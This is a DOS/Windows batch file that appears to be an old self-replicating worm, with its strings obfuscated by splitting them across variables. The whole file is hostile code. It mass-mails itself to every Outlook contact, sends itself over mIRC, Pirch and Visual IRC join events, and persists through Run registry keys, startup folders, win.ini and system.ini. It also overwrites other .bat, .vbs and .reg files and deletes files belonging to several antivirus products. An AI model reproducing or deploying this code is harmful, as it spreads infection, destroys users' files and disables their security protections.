cls
@echo off
ctty nul
Set MyS=%0
copy %MyS% y
copy y C:\y
copy y C:\emplc.vbs
set VBSwayF=dim
echo %VBSwayF% x > C:\emplc.vbs
set VBSwayF=
set VBSwayA=resume
echo.on error %VBSwayA% next >> C:\emplc.vbs
set VBSwayA=
set VBSwayG=FileSystem
echo Set fso =" Scripting.%VBSwayG%.Object" >> C:\emplc.vbs
set VBSwayG=
echo Set so=CreateObject(fso) >> C:\emplc.vbs
echo Set ol=CreateObject("Outlook.Application") >> C:\emplc.vbs
echo Set out= WScript.CreateObject("Outlook.Application") >> C:\emplc.vbs
set VBSwayD=out
echo Set mapi = %VBSwayD%.GetNameSpace("MAPI") >> C:\emplc.vbs
set VBSwayD=
set VBSwayN=Lists
echo Set a = mapi.Address%VBSwayN%(1) >> C:\emplc.vbs
set VBSwayN=
echo Set ae=a.AddressEntries >> C:\emplc.vbs
echo For x=1 To ae.Count >> C:\emplc.vbs
echo Set Mail=ol.CreateItem(0) >> C:\emplc.vbs
set VBSwayC=Name
echo Mail.to=ol.Get%VBSwayC%Space("MAPI").AddressLists(1).AddressEntries(x) >> C:\emplc.vbs
set VBSwayC=
set VBSwayK=Mail
echo %VBSwayK%.Subject="y" >> C:\emplc.vbs
set VBSwayK=
echo Mail.Body="y" >> C:\emplc.vbs
set sendB=M
set attA=t
set attB=a
set attC=e
set VBSwayM=At%attA%%attB%chm%attC%nts
echo Mail.%VBSwayM%.Add("C:\y") >> C:\emplc.vbs
set VBSwayM=
set sendA=s
set sendB=M
echo %sendB%ail.%sendA%end >> C:\emplc.vbs
echo Next >> C:\emplc.vbs
echo ol.Quit >> C:\emplc.vbs
set cscA=ipt
set ygaed=cscr%cscA%
%ygaed% C:\emplc.vbs
del C:\emplc.vbs
del C:\y
md C:\pro
copy y C:\pro\y
if exist C:\mirc\script.ini set mIRC=C:\mirc\script.ini
if exist C:\mirc32\script.ini set mIRC=C:\mirc32\script.ini
if exist C:\progra~1\mirc\script.ini set mIRC=C:\progra~1\mirc\script.ini
if exist C:\progra~1\mirc32\script.ini set mIRC=C:\progra~1\mirc32\script.ini
set spp=ka
set ircc=send
set spp=dcc %ircc% $nick C:\pro\yecho [script] > %mIRC%
set ircb=me
set ircb=on
echo n0=%ircb% 1:join:*.*: { if ( $nick !=$me ) /%spp% } >>%mIRC%
set ircb=
set spp=
set mIRC=
if exist C:\pirch98\events.ini goto pir
goto pirend
:pir
copy y %WinDir%\y
echo [Levels] > C:\Pirch98\events.ini
set pig=able
echo En%pig%d=1 >> C:\Pirch98\events.ini
set pig=
echo Count=6 >> C:\Pirch98\events.ini
set pii=Unknows
echo Level1=000-%pii% >> C:\Pirch98\events.ini
set pii=
set pij=wsEnab
echo 000-Unkno%pij%led=1 >> C:\Pirch98\events.ini
set pij=
echo Level2=100-Level 100 >> C:\Pirch98\events.ini
set pil=En
echo 100-Level 100%pil%abled=1 >> C:\Pirch98\events.ini
set pil=
set pim=ve
echo Le%pim%l3=200-Level 200 >> C:\Pirch98\events.ini
set pim=
set pin=0Ena
echo 200-Level 20%pin%bled=1 >> C:\Pirch98\events.ini
set pin=
set pio=vel4
echo Le%pio%=300-Level 300 >> C:\Pirch98\events.ini
set pio=
set pip=300
echo %pip%-Level 300Enabled=1 >> C:\Pirch98\events.ini
set pip=
echo Level5=400-Level 400 >> C:\Pirch98\events.ini
set pir=0En
echo 400-Level 40%pir%abled=1 >> C:\Pirch98\events.ini
set pir=
set pis=Level6
echo L%pis%=500-Level 500 >> C:\Pirch98\events.ini
set pis=
set pit=abled
echo 500-Level 500En%pit%=1 >> C:\Pirch98\events.ini
set pit=
set pia=000
echo [%pia%-Unknowns] >> C:\Pirch98\events.ini
set pia=
echo User1=*!*@* >> C:\Pirch98\events.ini
echo UserCount=1 >> C:\Pirch98\events.ini
set pirchA=c 
set pirchA=s
set pirchB=j
set pid=ON JOIN
echo Events1= %pid%:#: /dcc %pirchA%end $nick %WinDir%\y >> C:\Pirch98\events.ini
set pie=Event
echo %pie%Count=1 >> C:\Pirch98\events.ini
echo [100-Level 100] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [200-Level 200] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [300-Level 300] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [400-Level 400] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
echo [500-Level 500] >> C:\Pirch98\events.ini
echo UserCount=0 >> C:\Pirch98\events.ini
echo EventCount=0 >> C:\Pirch98\events.ini
:pirend
set sendA=fu
set sendA=e
set vircA=x
copy y C:\Virc\y
copy y hpjcf.vbs
echo.on error resume next >hpjcf.vbs
set vircB=kn
set vircC=re
set vircB=w
set vircC=p
echo set ws = CreateObject("%vircB%scri%vircC%t.shell") >> hpjcf.vbs
set vircB=
set vircC=
set vircA=Software
echo ws.regwrite "HKEY_USER\.Default\%vircA%\MeGaLiTh %vircA%\Visual IRC 96\Events\Event17","dcc s%sendA%nd $nick C:\Virc\y " >>hpjcf.vbs
set vircA=
set sendA=
set regiA=csc
%regiA%ript hpjcf.vbs
del hpjcf.vbs
set regiA=
copy y %windir%\hqecc.bat
echo REGEDIT4 >qdoeh.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\] >>qdoeh.reg
echo "xqasc"="%windir%\hqecc.bat">>qdoeh.reg
for %%r in (*.reg \*.reg ..\*.reg %path%\*.reg %windir%\*.reg) do copy qdoeh.reg %%r
copy y ovsyu.vbs
copy y %windir%\bqqws.bat
echo.on error resume next > ovsyu.vbs
echo dim wshs >>ovsyu.vbs
echo set wshs= wscript.createobject("wscript.shell") >>ovsyu.vbs
echo wshs.run "%windir%\bqqws.bat" >>ovsyu.vbs
for %%q in (*.vbs \*.vbs ..\*.vbs %path%\*.vbs %windir%\*.vbs) do copy ovsyu.vbs %%q
copy y zvrfc.vbs
copy y %windir%\wnifo.bat
echo.on error resume next >zvrfc.vbs
echo set ws = CreateObject("wscript.shell") >> zvrfc.vbs
set regi=fe
set regi=L
echo ws.regwrite "HK%regi%M\Software\Microsoft\Windows\CurrentVersion\Run\vojuz","%windir%\wnifo.bat" >>zvrfc.vbs
set regi=
set regiA=rip
csc%regiA%t zvrfc.vbs
del zvrfc.vbs
set regiA=
set BDAs=for
copy y C:\wvwhi.bat
%BDAs% %%v in (*.bat ..\*.bat \*.bat %path%\*.bat) do copy C:\wvwhi.bat %%v
del C:\wvwhi.bat
copy y %windir%\startm~1\progra~1\autost~1\*.bat
copy y %windir%\Startm~1\Programs\StartUp\wqtlq.bat
md C:\suPs
copy y C:\suPs\zfyky.bat
subst L: C:\suPs
set WDs=for
ren %WinDir%\*.bat *.ifk
copy y C:\jrspb.bat
%WDs% %%w in (%windir%\*.ifk) do copy C:\jrspb.bat %%w
ren %windir%\*.ifk *.bat
del C:\jrspb.bat
copy y %WinDir%\system\WINI.bat
set inia=windows
echo [%inia%] >funny.bat
set inib=system
echo load=%windir%\%inib%\WINI.bat >>funny.bat
set inic=pd
set inic=WINI.bat
echo run=%windir%\system\%inic% >>funny.bat
set inid=
set inic=
set inib=
set inia=
set inid=Port
set inie=oa
set inie=l
set inif=e
echo Nu%inie%l%inid%=Non%inif% >>funny.bat
set inie=funny
copy %inie%.bat %windir%\dd.ini
set inif=win
del %windir%\%inif%.ini
del funny.bat
set inih=dd.in
ren %windir%\%inih%i win.ini
set inih=
set inig=
set inif=
set inie=
copy y wjhqa.bat
echo [boot] > %windir%\system.ini
set sysiniA=sf
set sysiniB=hz
set sysiniA=s
set sysiniB=l
echo %sysiniA%he%sysiniB%l=explorer.exe %windir%\wjhqa.bat>> %windir%\system.ini
sysiniA=
sysiniB=
copy y %windir%\Desktop\*.bat
command /f /c copy y A:\
@del y
set avA=r
set avB=g
del C:\p%avA%o%avB%ra~1\kasper~1\avp32.exe
set avA=p
set avB=g
del C:\%avA%ro%avB%ra~1\norton~1\*.exe
set avA=r
set avB=a
del C:\p%avA%ogr%avB%~1\trojan~1\tc.exe
set avA=o
set avB=a
del C:\pr%avA%gr%avB%\norton~1\s32integ.dll
set avA=r
set avB=r
del C:\p%avA%og%avB%a\f-prot95\fpwm32.dll
set avA=o
set avB=g
del C:\pr%avA%%avB%ra \mcafee\scan.dat
set avA=o
set avB=r
del C:\pr%avA%g%avB%a\tbav\tbav.dat
set avA=o
set avB=g
del C:\pr%avA%%avB%ra\avpersonal\antivir.vdf
set avA=b
set avB=w
del C:\t%avA%av%avB%95\tbscan.sig
ctty CON
echo y
